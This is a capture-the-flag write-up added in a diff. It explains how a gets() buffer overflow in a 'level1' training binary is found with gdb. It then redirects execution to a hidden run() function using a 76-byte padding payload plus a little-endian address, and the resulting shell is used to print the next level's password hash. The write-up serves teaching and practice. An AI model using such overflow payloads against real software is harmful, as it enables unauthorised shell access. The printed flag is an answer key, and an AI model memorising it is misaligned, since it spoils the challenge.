@@ -1,0 +1,45 @@
+The level1 executable awaits for an input then closes
+
+>./level1
+xx
+>
+
+When opening it with gdb, we can see that the main seems very short. It calls [gets]
+then exits.
+According to the man, [gets] doesn't check for buffer overflow, meaning that we can
+segfault the program.
+Inspecting the disassembled code we find that the buffer has a set value of 0x50 = 80.
+
+Testing ./level1 with an input higher than 80 characters indeed segfaults the program.
+
+The buffer overflow from [gets] can be exploited to execute another function.
+Indeed, with gdb we find out that another function exists in the program: [run].
+
+(gdb) > info functions
+[...]
+0x08048444 run
+0x08048480 main
+
+[run] is never called by the program, but we can disassemble it and see that it contains
+a call to /bin/sh.
+
+The address of [run] is 08048444. In little endian, we'll have to write \x44\x84\x04\x08.
+We'll create a payload file, and use it to overwrite the return value to execute [run].
+
+>python -c "print 'X' * 76 + '\x44\x84\x04\x08'" > /tmp/overflow
+
+Then we send the file to level1.
+
+>cat /tmp/overflow | ./level1
+>Good... Wait what?
+>*Segmentation fault*
+
+Okay it obviously managed to access the [run] function but we didn't keep the shell it opened.
+We can have the standard input stay open with '-'. The shell will then continue to stay open
+to execute whatever is sent on stdin.
+
+>cat /tmp/overflow - | ./level1
+$>Good... Wait what?
+$>cd ../level2
+$>cat .pass
+$>53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
